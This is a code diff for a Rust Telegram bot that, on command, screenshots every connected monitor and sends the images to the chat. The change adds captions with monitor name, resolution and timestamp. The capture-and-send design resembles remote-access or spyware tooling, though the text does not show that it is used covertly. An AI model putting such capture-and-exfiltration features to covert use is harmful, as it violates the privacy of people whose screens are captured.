@@ -84,7 +84,7 @@ async fn handle_help(bot: Bot, msg: Message) -> Result<()> {
 async fn handle_screenshot(bot: Bot, msg: Message) -> Result<()> {
     bot.send_message(msg.chat.id, "🖼️ Taking Screenshots...")
         .await?;
-    let images = crate::core::screenshot_all_screens().unwrap_or_default();
+    let images = crate::screen_capture::screenshot_all_screens().unwrap_or_default();
     if images.is_empty() {
         bot.send_message(msg.chat.id, "🖼️ No Images were provided.")
             .await?;
@@ -92,17 +92,26 @@ async fn handle_screenshot(bot: Bot, msg: Message) -> Result<()> {
     }
     for (chunk_idx, chunk) in images.chunks(10).enumerate() {
         if chunk.len() == 1 {
-            bot.send_photo(msg.chat.id, InputFile::memory(chunk[0].clone()))
-                .caption(format!("🖼️ Image {}", chunk_idx * 10 + 1))
+            let s = &chunk[0];
+            bot.send_photo(msg.chat.id, InputFile::memory(s.image.clone()))
+                .caption(format!(
+                    "🖼️ {} | {}x{} | {}",
+                    s.monitor_name, s.width, s.height, s.timestamp
+                ))
                 .await?;
         } else {
             let media: Vec<InputMedia> = chunk
                 .iter()
                 .enumerate()
-                .map(|(i, img)| {
-                    let mut photo = InputMediaPhoto::new(InputFile::memory(img.clone()));
+                .map(|(i, s)| {
+                    let mut photo = InputMediaPhoto::new(InputFile::memory(s.image.clone()));
                     if i == 0 {
                         photo = photo.caption(format!("🖼️ Screenshot — batch {}", chunk_idx + 1));
+                    } else {
+                        photo = photo.caption(format!(
+                            "{} | {}x{} | {}",
+                            s.monitor_name, s.width, s.height, s.timestamp
+                        ));
                     }
                     InputMedia::Photo(photo)
                 })
